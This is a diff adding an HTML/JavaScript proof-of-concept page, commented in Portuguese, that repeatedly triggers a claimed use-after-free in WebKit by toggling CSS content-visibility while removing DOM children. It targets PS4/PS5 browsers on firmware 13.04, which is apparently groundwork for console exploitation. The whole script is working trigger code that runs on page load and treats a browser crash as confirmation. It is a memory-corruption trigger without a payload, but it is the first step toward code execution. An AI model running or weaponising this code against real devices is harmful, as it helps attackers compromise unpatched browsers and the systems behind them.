@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<!--
+  PoC: content-visibility DOM Layer Tree UAF (sem CVE)
+
+  DESCRIÇÃO:
+  UAF no tratamento da árvore de camadas DOM do WebKit ao manipular
+  a propriedade CSS content-visibility combinada com remoção de
+  elementos DOM.
+
+  SEQUÊNCIA DE TRIGGER:
+  1. Definir content-visibility: hidden no div pai
+  2. Remover o div filho → libera memória associada à layer
+  3. Restaurar content-visibility: auto → dispara recomputação
+  4. WebKit acessa objeto já freed → UAF
+
+  CONFIRMADO: PS4 e PS5 por Dark-life944 (25/04/2025)
+  Fix: Zak Ridouh + Antoine Quint, Apple WebKit Security (22/05/2025)
+  STATUS FW 13.04: NÃO TESTADO — Fix de mai/2025 provavelmente não aplicado
+-->
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>content-visibility UAF — Dark-life944</title>
+<style>
+  body{background:#0a0a0a;color:#ccc;font-family:monospace;padding:16px;margin:0;font-size:13px}
+  #log{background:#111;border:1px solid #333;padding:10px;height:76vh;overflow-y:auto;font-size:11px;line-height:1.8}
+  .ok{color:#00ff88}.fail{color:#ff4444}.info{color:#ffcc44}.warn{color:#ff8844}
+  .vuln{color:#ff44ff;font-weight:bold}.patched{color:#44aaff}.dim{color:#555}
+  .bar{background:#0a1a0a;border:1px solid #1a3a1a;color:#44aa44;padding:6px 10px;margin-bottom:8px;font-size:11px}
+  #arena{position:absolute;top:-9999px;left:-9999px;width:200px;height:200px}
+</style>
+</head>
+<body>
+<div style="color:#aaa;font-size:12px;margin-bottom:6px">content-visibility UAF · Dark-life944 · PS4+PS5 Confirmado · FW 13.04</div>
+<div class="bar" id="bar">Iniciando...</div>
+<div id="log"></div>
+<div id="arena"></div>
+<script>
+"use strict";
+var logEl=document.getElementById('log'),barEl=document.getElementById('bar');
+var arena=document.getElementById('arena');
+function L(m,c){logEl.innerHTML+='<div class="'+(c||'dim')+'">'+m+'</div>';logEl.scrollTop=logEl.scrollHeight;}
+function bar(m){barEl.textContent=m;}
+
+function triggerUAF(iterations){
+  for(var i=0;i<iterations;i++){
+    // Criar estrutura pai/filho
+    var parent=document.createElement('div');
+    var child=document.createElement('div');
+    child.style.cssText='width:100px;height:100px;background:#ff0000;transform:translateZ(0)';
+    parent.appendChild(child);
+    arena.appendChild(parent);
+
+    // Fase 1: esconder com content-visibility (aloca layer object)
+    parent.style.contentVisibility='hidden';
+
+    // Fase 2: forçar layout para materializar a layer
+    void parent.offsetWidth;
+
+    // Fase 3: remover filho (potencialmente libera layer associada)
+    parent.removeChild(child);
+
+    // Fase 4: restaurar content-visibility (dispara recomputação da layer)
+    // WebKit tenta acessar a layer do filho que foi freed
+    parent.style.contentVisibility='auto';
+
+    // Fase 5: forçar reflow para disparar o use-after-free
+    void parent.offsetWidth;
+
+    // Cleanup
+    arena.removeChild(parent);
+  }
+}
+
+function run(){
+  L('content-visibility DOM Layer Tree UAF','info');
+  L('Confirmado PS4+PS5 por Dark-life944 em 25/04/2025','info');
+  L('Fix upstream: 22/05/2025 (provavelmente não no FW 13.04)','info');
+  L('','');
+
+  // Verificar suporte a content-visibility
+  L('[1/4] Verificando suporte a content-visibility...','warn');
+  bar('[1/4] Verificando suporte...');
+  setTimeout(function(){
+    var testEl=document.createElement('div');
+    testEl.style.contentVisibility='hidden';
+    var supported=(testEl.style.contentVisibility==='hidden');
+    if(!supported){
+      L('[1/4] content-visibility NÃO suportado — bug não aplicável','fail');
+      bar('NÃO SUPORTADO');
+      return;
+    }
+    L('[1/4] content-visibility suportado ✓','ok');
+
+    // Aquecimento
+    L('','');
+    L('[2/4] Aquecimento (100 iterações)...','warn');
+    bar('[2/4] Aquecimento...');
+    setTimeout(function(){
+      try{
+        triggerUAF(100);
+        L('[2/4] Aquecimento OK ✓','ok');
+      }catch(e){L('[2/4] Exceção no aquecimento: '+e,'warn');}
+
+      // Trigger principal
+      L('','');
+      L('[3/4] Trigger principal (1000 iterações)...','warn');
+      L('[3/4] SE O BROWSER FECHAR = UAF CONFIRMADO','vuln');
+      bar('[3/4] Disparando UAF...');
+      setTimeout(function(){
+        try{
+          triggerUAF(1000);
+          L('[3/4] 1000 iterações sem crash','ok');
+        }catch(e){L('[3/4] Exceção: '+e,'warn');}
+
+        // Trigger agressivo com nesting
+        L('','');
+        L('[4/4] Trigger agressivo com nesting profundo...','warn');
+        bar('[4/4] Trigger agressivo...');
+        setTimeout(function(){
+          try{
+            for(var i=0;i<200;i++){
+              var root=document.createElement('div');
+              var cur=root;
+              // Nesting de 5 níveis com transform layers
+              for(var d=0;d<5;d++){
+                var n=document.createElement('div');
+                n.style.cssText='transform:translateZ(0);width:50px;height:50px';
+                cur.appendChild(n);
+                cur=n;
+              }
+              arena.appendChild(root);
+              root.style.contentVisibility='hidden';
+              void root.offsetWidth;
+              // Remover nós do meio
+              var children=root.querySelectorAll('div');
+              if(children.length>2){
+                children[1].parentNode.removeChild(children[1]);
+                children[2].parentNode.removeChild(children[2]);
+              }
+              root.style.contentVisibility='auto';
+              void root.offsetWidth;
+              arena.removeChild(root);
+            }
+            L('[4/4] Trigger agressivo completado sem crash','ok');
+          }catch(e){L('[4/4] Exceção: '+e,'warn');}
+
+          L('','');
+          L('══════════════════════════════════','warn');
+          L('CRASH = content-visibility UAF PRESENTE','vuln');
+          L('SEM CRASH = PATCHED ou mitigado','patched');
+          L('══════════════════════════════════','warn');
+          bar('DONE');
+        },300);
+      },300);
+    },200);
+  },200);
+}
+window.addEventListener('load',function(){setTimeout(run,300);});
+</script>
+</body>
+</html>
